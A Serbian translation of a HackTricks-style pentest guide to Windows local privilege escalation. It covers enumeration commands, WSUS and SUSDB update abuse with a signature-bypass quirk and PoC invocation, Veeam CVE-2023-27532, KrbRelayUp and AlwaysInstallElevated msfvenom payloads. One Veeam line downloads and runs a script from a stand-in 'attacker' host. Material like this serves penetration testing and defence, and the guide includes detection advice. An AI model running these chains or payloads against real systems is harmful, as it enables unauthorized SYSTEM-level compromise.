# Windows lokalno podizanje privilegija

{{#include ../../banners/hacktricks-training.md}}

### **Najbolji alat za pronalaženje vektora za lokalno podizanje privilegija u Windowsu:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Ova stranica objedinjuje opštu metodologiju za podizanje privilegija u Windowsu iz nekoliko temeljnih vodiča.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Praktični postupak enumeracije oslanja se i na radionice i kontrolne liste zajednice.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Istorijski materijal o napadima obuhvata prezentaciju o podizanju privilegija u Windowsu održanu na DerbyConu.<sup>[[5]](#references)</sup>

## Osnove Windowsa

### Tokeni pristupa

**Ako ne znate šta su Windows tokeni pristupa, pročitajte sledeću stranicu pre nego što nastavite:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACL-ovi - DACL-ovi/SACL-ovi/ACE-ovi

**Više informacija o ACL-ovima - DACL-ovima/SACL-ovima/ACE-ovima potražite na sledećoj stranici:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Nivoi integriteta

**Ako ne znate šta su nivoi integriteta u Windowsu, pročitajte sledeću stranicu pre nego što nastavite:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Bezbednosne kontrole u Windowsu

U Windowsu postoje različite stvari koje mogu **sprečiti enumeraciju sistema**, pokretanje izvršnih datoteka ili čak **otkriti vaše aktivnosti**. Pre nego što započnete enumeraciju za podizanje privilegija, trebalo bi da **pročitate** sledeću **stranicu** i **enumerišete** sve ove **odbrambene** **mehanizme**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Fizički pristup može omogućiti i da se izmena UEFI NVRAM-a van mreže pretvori u DMA pre pokretanja sistema i lanac zakrpljivanja memorije Windows procesa `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / neprimetno podizanje privilegija UIAccess-a

UIAccess procesi pokrenuti preko `RAiLaunchAdminProcess` mogu se zloupotrebiti za dostizanje nivoa High IL bez upita, kada se zaobiđu provere bezbedne putanje AppInfo-a. Pogledajte namenski postupak za zaobilaženje UIAccess/Admin Protection zaštite ovde:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Propagacija registra pristupačnosti Secure Desktop-a može se zloupotrebiti za proizvoljno upisivanje u registar kao SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Novije verzije Windowsa uvele su i LPE putanju za **SMB proizvoljnog porta**, u kojoj se privilegovana lokalna NTLM autentifikacija reflektuje preko ponovo upotrebljene SMB TCP veze:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Informacije o sistemu

### Enumeracija informacija o verziji

Proverite da li verzija Windowsa ima neku poznatu ranjivost (proverite i primenjene zakrpe).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Iskorišćavanje ranjivosti specifičnih za verziju

Ovaj [sajt](https://msrc.microsoft.com/update-guide/vulnerability) je koristan za pretragu detaljnih informacija o Microsoft bezbednosnim ranjivostima. Ova baza podataka sadrži više od 4.700 bezbednosnih ranjivosti, što pokazuje **ogromnu površinu napada** koju pruža Windows okruženje.

**Na sistemu**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ima ugrađen watson)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — popisuje verziju OS-a, instalirane ispravke i odabrane kandidate za bezbednosne preporuke; proverite tačan proizvod i naknadne ispravke pre nego što rezultat smatrate primenljivim.

Za lokalni exploit specifičan za verziju proverite **arhitekturu pokrenutog procesa**, kao i arhitekturu OS-a. Na 64-bitnom Windowsu, 32-bitni proces podleže [WOW64 preusmeravanju sistema datoteka](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` se obično razrešava u 32-bitni sistemski direktorijum, dok `%windir%\Sysnative` tom procesu omogućava pristup izvornom sistemskom direktorijumu. Ovaj alias nije dostupan 64-bitnom procesu. Verzija OS-a ili kandidat za nedostajuću KB ispravku ne dokazuju da je sistem podložan exploit-u; uporedite pokrenutu verziju, instaliranu ili naknadnu ispravku, arhitekturu procesa i preduslove za exploit sa [Microsoft bezbednosnim biltenom](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) za konkretnu ranjivost.

Primer oštećenja memorije servisa potražite u tekstu o [offset-ima prstenastog bafera deljene memorije za MIDI koje kontroliše klijent](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions). Objavljeni offset-i steka važe samo za testiranu verziju; dobijanje privilegija `LOCAL SERVICE` razlikuje se od narednog koraka [SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md) za prelazak na `SYSTEM`.<sup>[[44]](#references)</sup>

**Lokalno, uz informacije o sistemu**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**GitHub repozitorijumi sa exploit-ima:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Okruženje

Da li su neke akreditive/Juicy informacije sačuvane u promenljivama okruženja?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Istorija PowerShell-a

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell datoteke transkripta

Možete saznati kako da ovo uključite na [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` je samo primer. [PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) obično zapisuje datoteke u fasciklu Documents svakog korisnika, ali postavka `OutputDirectory` ili `Start-Transcript -OutputDirectory` može da preusmeri datoteke u deljenu ili skrivenu fasciklu. Pre pregleda transkripta proverite efektivnu izlaznu putanju i ACL datoteke: transkript može da sadrži argumente komandi i izlaz, uključujući akreditive. Transkript koji može da se pročita predstavlja samo trag ako njegov sadržaj otkriva upotrebljiv identitet sa višim privilegijama i ako taj identitet može da se prijavi u relevantnom kontekstu.

### PowerShell Module Logging

Beleže se detalji izvršavanja PowerShell pipeline-a, uključujući izvršene komande, pozive komandi i delove skripti. Međutim, možda neće biti zabeleženi potpuni detalji izvršavanja i rezultati izlaza.

Da biste ovo omogućili, pratite uputstva u odeljku dokumentacije „Datoteke transkripta“ i izaberite **„Module Logging“** umesto **„Powershell Transcription“**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Da biste videli poslednjih 15 događaja iz PowersShell logova, možete izvršiti:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Beleži se potpuna aktivnost i celokupan sadržaj izvršavanja skripte, čime se osigurava dokumentovanje svakog bloka koda tokom izvršavanja. Ovaj postupak čuva sveobuhvatan revizijski trag svake aktivnosti, što je korisno za forenzičku analizu i proučavanje zlonamernog ponašanja. Dokumentovanjem svih aktivnosti u trenutku izvršavanja pruža se detaljan uvid u proces.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Događaji evidentiranja za Script Block mogu se pronaći u Windows Event Viewer-u na putanji: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Da biste prikazali poslednjih 20 događaja, možete koristiti:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Internet podešavanja

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Diskovi

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Prethodne smernice su rizik sažele ovako:

Možete kompromitovati sistem ako se ažuriranja zahtevaju preko http, a ne preko http**S**.

HTTP WSUS endpoint je signal za proveru mogućeg presretanja metapodataka ažuriranja. Eksploatacija takođe zavisi od toga da li klijent koristi taj WSUS server, da li napadač može da presretne ili kontroliše njegov saobraćaj i od klijentovih pravila za poverenje u ažuriranja i njihovu instalaciju. Sam URL ne znači da je moguće izvršavanje koda. [Microsoft preporučuje TLS za WSUS metapodatke](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Najpre proverite da li mreža koristi WSUS ažuriranje bez SSL-a tako što ćete u cmd pokrenuti sledeće:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Ili sledeće u PowerShell-u:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Ako dobijete odgovor poput nekog od sledećih:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

A ako je `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ili `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` jednako `1`.

Prvobitna izjava o mogućnosti iskorišćavanja bila je:

Tada je **moguće iskoristiti ranjivost.** Ako je poslednja vrednost registra jednaka `0`, unos za WSUS biće zanemaren.

Kada je `UseWUServer` postavljen na `1`, Windows Update koristi konfigurisanu intranet uslugu. Time se potvrđuje preduslov za putanju presretanja HTTP saobraćaja, ali se ne dokazuje da je presretanje moguće, da će zlonamerno ažuriranje biti prihvaćeno niti da se može instalirati sa povišenim privilegijama. Kada je vrednost `0`, ova konkretna WSUS krajnja tačka konfigurisana ovom smernicom neće biti izabrana.

Da biste iskoristili ove ranjivosti, možete koristiti alate kao što su: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — ovo su weaponized MiTM exploit skripte za ubacivanje „lažnih“ ažuriranja u WSUS saobraćaj koji ne koristi SSL.

Pročitajte istraživanje ovde:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Ceo izveštaj pročitajte ovde**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Ukratko, ovo je propust koji ova greška iskorišćava:

> Ako možemo da menjamo proxy podešavanja lokalnog korisnika, a Windows Updates koristi proxy konfigurisan u podešavanjima programa Internet Explorer, možemo lokalno da pokrenemo [PyWSUS](https://github.com/GoSecure/pywsus), presretnemo sopstveni saobraćaj i izvršavamo kod sa povišenim privilegijama na našem sistemu.
>
> Pored toga, pošto WSUS usluga koristi podešavanja trenutnog korisnika, koristiće i njegovo skladište sertifikata. Ako generišemo self-signed sertifikat za WSUS hostname i dodamo ga u skladište sertifikata trenutnog korisnika, moći ćemo da presretnemo i HTTP i HTTPS WSUS saobraćaj. WSUS ne koristi mehanizme nalik na HSTS za validaciju tipa trust-on-first-use sertifikata. Ako korisnik veruje predstavljenom sertifikatu i on ima ispravan hostname, usluga će ga prihvatiti.

Ovu ranjivost možete iskoristiti alatom [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (kada bude objavljen).

### Ažuriranja kojima upravlja WSUS administrator

Postoji zasebna putanja kada trenutni identitet može da **objavljuje i odobrava** ažuriranja na WSUS serveru. Proverite efektivno članstvo u grupi `WSUS Administrators` на серверу и sva delegirana WSUS prava, a zatim utvrdite koja grupa klijenata bi primila odobreno ažuriranje. [Microsoft zahteva WSUS Administrator privilegije za odobravanje ažuriranja](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) i [dokumentuje odnos poverenja pri objavljivanju](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): klijenti moraju da veruju potpisnom sertifikatu koji se koristi za lokalno objavljen sadržaj. Pre nego što ovo smatrate putanjom za eskalaciju, potvrdite da je kandidat za ažuriranje potpisan i prihvaćen, da se odnosi na cilj i da se instalira u kontekstu sa većim privilegijama. Sama HTTP vrednost `WUServer` ili naziv grupe ne potvrđuju te uslove.

### Zloupotreba prilagođenih ažuriranja u SUSDB-u: nepotpisani payload-i preko `.txt`/`.esd`

Ovo je drugačiji propust na granici poverenja od presretanja HTTP WSUS veze: preduslov je dovoljan pristup **stored procedure-ama WSUS baze podataka (`SUSDB`)** za objavljivanje i odobravanje prilagođenog ažuriranja. Jedan praktičan način pristupa jeste relay naloga WSUS računara ka zasebnom MSSQL serveru na kom se nalazi `SUSDB`; tačni preduslovi zavise od konkretne implementacije, zato najpre izlistajte `EXECUTE` dozvole umesto da pretpostavite da su potrebna SQL administrator prava.<sup>[[38]](#references)[[39]](#references)</sup>

Za zasebnu napadnu putanju koja prosleđuje WSUS klijentsku autentifikaciju sa HTTP/8530 ka LDAP-u, SMB-u ili AD CS-u, pogledajte [Zloupotreba WSUS HTTP-a za NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Potvrdite relay ka eksternoj bazi podataka i prava na procedure

U implementacijama gde WSUS koristi eksterni SQL Server, najpre proverite da li nalog WSUS servera može da se autentifikuje na bazi podataka i da li NTLM relay stiže do tog listener-a. SQL uloga servera može da omogući pristup procedurama za objavljivanje ažuriranja čak i kada su direktni upisi u tabele zabranjeni; neuspešan `UPDATE` nad `SUSDB` ne dokazuje da je objavljivanje onemogućeno. Pre pokušaja objavljivanja prilagođenog ažuriranja, proverite efektivni identitet, članstvo u ulogama i dozvole nad procedurama u ovlašćenoj SQL sesiji.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Definicije procedura uživo i instalirani `SoftwareDistributionPackage.xsd` korisni su pri rekonstrukciji ispravnih metapodataka za ažuriranje. Roditeljski bundle i podređeni payload moraju da sadrže `UpdateIdentity` (tip fragmenta `1`), `LocalizedProperties` (`4`) i `ExtendedProperties` (`2`); zabeležite lokalni ID revizije koji vraća svaki poziv funkcije `spImportUpdate` i uskladite odnos između bundle-a i payload-a, sažetke, veličinu, URL sadržaja i reviziju. Ovo je tok objavljivanja sa stanjem, pa jedan uspešan poziv sačuvane procedure nije dokaz da je došlo do izvršavanja na strani klijenta.<sup>[[38]](#references)</sup>

#### Napravite, ciljajte i odobrite ažuriranje

Tok rada za prilagođeno ažuriranje koristi legitimne WSUS procedure kao ograničeni API za objavljivanje. Važni prelazi stanja su:<sup>[[38]](#references)</sup>

| Faza | Relevantne sačuvane procedure |
| --- | --- |
| Uvezite metapodatke ažuriranja | `spImportUpdate` |
| Sačuvajte XML fragmente za preduslove, lokalizovana i proširena svojstva | `spSaveXMLFragment` |
| Povežite sažetak sadržaja sa URL-om koji kontroliše napadač | `spSetBatchURL` |
| Prikažite/napravite grupu računara i dodajte klijenta | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Odobrite instalaciju za tu grupu | `spDeployUpdate` sa `@actionID = 0` i `@isAssigned = 1` |

Ime datoteke, sažetci, veličina i rukovalac `CommandLineInstallation` moraju da budu usklađeni u svim uvezenim metapodacima/fragmentima. Nakon dodeljivanja URL-a sadržaja i ciljne grupe, konačno odobrenje izgleda otprilike ovako; koristite nove identifikatore za ažuriranje, grupu i deployment umesto da ponovo koristite GUID-ove iz primera.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Zaobilaženje potpisa zasnovano na ekstenziji

WSUS obično odbacuje proizvoljan nepotpisan izvršni sadržaj. Međutim, u datoteci `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, putanja `.NET` metode `VerifyFile` postavlja zastavicu za proveru sertifikata na `false` kada se prosleđeno ime datoteke završava sa `.txt` ili `.esd`; `CheckCertificateSignature` se zato preskače, a da se prethodno ne proveri da li su bajtovi tekst ili ispravna ESD slika. Zbog toga neizmenjeni PE fajl, na primer, nazvan `payload.exe.txt` može da prođe proveru sadržaja i da ga kasnije pokrene handler za instalaciju ažuriranja iz komandne linije. Ovo je greška u politici/proveri tipa, a ne falsifikovanje potpisa.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS-kompatibilno postavljanje sadržaja i automatizacija

Pozivanje `spDeployUpdate` navodi WSUS da preuzme registrovani sadržaj. Izvorni server mora da ispunjava HTTP očekivanja BITS-a: dostupna URL adresa nije dovoljna jer prenos koristi početni `HEAD`/`GET` tok i zahteve za opsege bajtova. Server bez podrške za Range izaziva WSUS događaj sinhronizacije `EventId=364`, koji navodi da BITS zahteva zaglavlje protokola Range.<sup>[[39]](#references)</sup>

Istraživački PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) generiše SQL potreban za lanac import/fragment/URL/grupa/deployment, uključuje modifikovani MSSQL klijent za njegovo izvršavanje i sadrži `BitsWebServer.py` za postavljanje sadržaja. Minimalni poziv za ovlašćenu laboratoriju je:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Nepraćeno izvršavanje i postojanost kroz ponovne pokušaje

Interakcija na strani klijenta zavisi od politike. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, opcija `4 - Auto download and schedule install`, omogućava da se odobreno ažuriranje preuzme i instalira prema podešenom rasporedu, bez ručnog izbora korisnika. Tokom testiranja, payload čije ažuriranje nije uspelo ili je ostalo nedovršeno ponovo je ponuđen odmah nakon izlaska callback procesa, pa ponašanje pri ponovnom pokušaju može da dovede do postojanog ponavljanja izvršavanja; pritom je upadljivo jer klijent prikazuje stanje neuspelog ažuriranja.<sup>[[39]](#references)</sup>

#### Mesta za detekciju i jačanje zaštite

Korisne tačke za proveru na strani servera i klijenta u ovom lancu su:<sup>[[39]](#references)</sup>

- Revidirajte izvršavanje `spCreateTargetGroup`, `spSetBatchURL` i `spDeployUpdate` u `SUSDB`; istražite nove ciljne grupe, eksterne izvore sadržaja, `.txt`/`.esd` payloadove ažuriranja i deployments koje su izvršili neočekivani principals (posebno nalozi koji nisu računari).
- Pregledajte `C:\Program Files\Update Services\LogFiles` u potrazi za `ContentSyncAgent`, `FileVerified`, pogrešno napisanim `FileVerficationFailed` i `EventId=364`; uporedite verifikaciju sa ekstenzijom payloada i potpisom sadržaja, umesto da verujete sufiksu.
- Tražite ponavljane neuspehe i pokušaje instalacije Windows Update-a, kao i izvršavanje PE fajlova ili neočekivanu aktivnost podređenih procesa/mreže iz sadržaja sa nazivima `.txt` ili `.esd`.
- Tamo gde je podržano, zahtevajte Extended Protection for Authentication za servis baze podataka i ograničite mrežni pristup bazi na WSUS server i ovlašćene administrativne sisteme. Svedite `EXECUTE` prava nad procedurama za prilagođena ažuriranja na minimum i revidirajte ih.

## Auto-updateri trećih strana i Agent IPC (lokalni privesc)

Mnogi enterprise agenti izlažu IPC površinu na localhost adresi i privilegovani kanal za ažuriranje. Ako registraciju može da se preusmeri na server napadača, a updater veruje lažnom root CA sertifikatu ili koristi slabe provere potpisnika, lokalni korisnik može da isporuči zlonamerni MSI koji SYSTEM servis instalira. Ovde pogledajte uopštenu tehniku (zasnovanu na Netskope stAgentSvc lancu – CVE-2025-0309):


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM preko TCP 9401)

Prvobitni opis za određenu verziju i beleška o izviđanju glasili su:

Veeam B&R < `11.0.1.1261` izlaže localhost servis na **TCP/9401** koji obrađuje poruke pod kontrolom napadača, čime omogućava izvršavanje proizvoljnih komandi kao **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup>

- **Izviđanje**: potvrdite listener i verziju, npr. pomoću `netstat -ano | findstr 9401` i `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.

Veeam Backup & Replication i Cloud Connect podrazumevano koriste osnovni servis za bekap na **TCP/9401**. [Veeam-ovo bezbednosno obaveštenje](https://www.veeam.com/kb4424) opisuje neautentifikovano otkrivanje šifrovanih akreditiva baze podataka konfiguracije unutar perimetra mreže za bekap; zaseban javni PoC demonstrira putanju do izvršavanja komandi kao **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Servis može da se veže za adresu koja nije localhost, pa proverite njegovu stvarnu adresu i PID.

- **Izviđanje**: potvrdite da TCP/9401 pripada procesu `Veeam.Backup.Service.exe`, a zatim proverite instalirani proizvod i metapodatke zakrpa. `netstat -ano | findstr 9401` i `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` predstavljaju naznake, a ne potpunu proveru zakrpa.
- **Prve ispravljene verzije**: Veeam navodi **11a build 11.0.1.1261 P20230227** i **12 build 12.0.0.1420 P20230223** kao prva ispravljena izdanja; pogođena su ranija izdanja. Četvorodelna verzija fajla sama po sebi ne može da razlikuje nezakrpljeni osnovni build od kasnije zakrpe na istom broju builda. Pre nego što build na granici proglasite ispravljenim, proverite identifikator zakrpe prema [istoriji buildova proizvođača](https://www.veeam.com/kb2680).
- **Eksploatacija**: smestite PoC, kao što je `VeeamHax.exe`, zajedno sa potrebnim Veeam DLL-ovima u isti direktorijum, a zatim pokrenite SYSTEM payload preko lokalnog socketa:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Servis izvršava komandu kao SYSTEM.

Navedeni PoC demonstrira izvršavanje komandi kao SYSTEM kada su ispunjeni dodatni preduslovi; savetodavno obaveštenje proizvođača opisuje problem otkrivanja kredencijala.

## KrbRelayUp

Prvobitni opis podrazumevanog okruženja glasio je:

U Windows okruženjima **domena** postoji ranjivost **local privilege escalation** pod određenim uslovima. Ti uslovi obuhvataju okruženja u kojima **LDAP signing nije nametnut**, korisnici imaju sopstvena prava koja im omogućavaju da konfigurišu **Resource-Based Constrained Delegation (RBCD)** i mogu da kreiraju računare unutar domena. Važno je napomenuti da su ovi **zahtevi** ispunjeni uz korišćenje **podrazumevanih postavki**.

Lokalni Kerberos relay može da omogući prelazak sa prijave sa nižim privilegijama na privilegovani upis u direktorijum, ako se odgovarajući COM server autentifikuje i prosleđeni principal ima prava nad ciljnim objektom. [KrbRelay dokumentuje](https://github.com/cube0x0/KrbRelay) LDAP upise za RBCD i `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp automatizuje neke od ovih putanja. RBCD lanac zahteva odgovarajuću delegaciju i prava nad ciljnim objektom, dok shadow-credential lanac zahteva prava za upis ključa i KDC koji podržava putanju autentifikacije sertifikatom. Nijedna od ovih putanja ne proizlazi samo iz članstva u domenu.

Proverite stvarnu politiku DC-a za [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) i [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), ACL objekta za identitet koji se prosleđuje i nivoe autentifikacije i impersonacije izabrane COM klase. Važni su tip prijave pozivaoca i kontekst kredencijala: WinRM sesija može da se ponaša drugačije od interaktivne prijave ili prijave sa novim kredencijalima. Rutiranje Firewall/OXID-a i instalirane ispravke takođe mogu da utiču na ishod. Permisivnu politiku ili ACL koji odgovara uslovima smatrajte kandidatom za proveru; pasivna enumeration ne bi trebalo da pokreće COM coercion, relay autentifikaciju ili upise u direktorijum. Shadow credential mašinskog naloga može da dovede do mašinskog tiketa, a zatim, samo ako taj nalog ima potrebna prava za replikaciju direktorijuma, до zasebne DCSync putanje.

Pronađite **exploit na** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Za više informacija o toku napada pogledajte [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Ako** su ova 2 ključa registra **omogućena** (vrednost je **0x1**), korisnici sa bilo kojim nivoom privilegija mogu da **instaliraju** (izvršavaju) datoteke `*.msi` kao NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Ako imate meterpreter sesiju, ovu tehniku možete automatizovati pomoću modula **`exploit/windows/local/always_install_elevated`**

### PowerUP

Koristite komandu `Write-UserAddMSI` iz power-up da biste u trenutnom direktorijumu napravili Windows MSI binarnu datoteku za eskalaciju privilegija. Ova skripta ispisuje unapred kompajlirani MSI installer koji traži dodavanje korisnika/grupe (zato će vam biti potreban GIU pristup):

```
Write-UserAddMSI
```

Samo pokrenite kreirani binarni fajl da biste eskalirali privilegije.

### MSI Wrapper

Pročitajte ovaj vodič da biste saznali kako da napravite MSI wrapper pomoću ovog alata. Imajte na umu da možete da umotate datoteku „**.bat**” ako samo želite da **izvršite** **komandne linije**.


{{#ref}}
msi-wrapper.md
{{#endref}}

### Kreiranje MSI-ja pomoću WIX-a


